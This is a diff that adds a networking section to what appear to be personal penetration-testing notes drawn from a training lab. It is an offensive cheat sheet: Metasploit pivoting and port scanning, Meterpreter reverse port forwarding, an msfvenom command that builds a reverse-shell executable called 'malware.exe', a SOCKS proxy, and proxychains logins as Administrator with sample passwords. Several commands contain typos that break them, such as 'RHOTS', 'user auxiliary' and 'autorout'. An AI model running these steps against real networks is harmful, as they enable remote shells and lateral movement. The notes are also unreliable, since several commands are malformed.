@@ -125,6 +125,63 @@ Meterpreter Terrorism
       keyscan_dump  : dump logged keys
       screenshot
                   
-                  
+
+       
+       
+       
+       
+Networking
+       
+       Address Resolution Protocol
+       arp -a
+       ip neigh show
+       
+       route print  - routing table
+       route
+       
+       
+       Conenctions and ports
+       netstat -ano
+       ss - peanut
+       
+       msf6
+       run post/multi/manage/autorout
+       cmd=add subnet=192.168.16.0 netmask=/24
+       run post/multi/manage/autoroute cmd=print
+       
+       Port Scan in metasploit
+       user auxiliary/scanner/portscan/tcp
+       set RHOTS 192.168.16.5
+       set ports 1-1000
+       run
+       
+       Reverse Port Forwarding on Meterpreter
+       portfwd add -R -p 1234 -l 443 -L 192.168.3.28
+                     -R is reverse
+                     -p is remotre port
+                     -l is local port
+                     -L is Listening host
+                     192.168.3.28:443 <-> 0.0.0.0:1234
+       
+       Getting a Shell on Internal host
+       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.16.3 LPORT=1234 -f exe -o malware.exe
+              LHOST and LPORT need to be set to compromised internal host when doing lateral movement. Just think, it makes sense.
+       
+       
+       Proxying n Metasploit
+       configure SOCKS proxy server
+       use auxiliary/server/socks_proxy
+       set srvport 9050
+       set version 4a
+       exploit -j
+       
+              Proxy allows us to communicate with the internal host from our native terminal
+       
+       Proxychains
+       used to run commands through a proxy
+       $ proxychains evil-winrm -u Administrator -p 'Oasswird123!' -i 192.168.16.5   (assumes credentials already got)
+       $ proxychains xfreerdp /u:Administrator /p:'Password123!' /v:192.168.16.5 /d.mayorsec
+       
+       
                   
                   
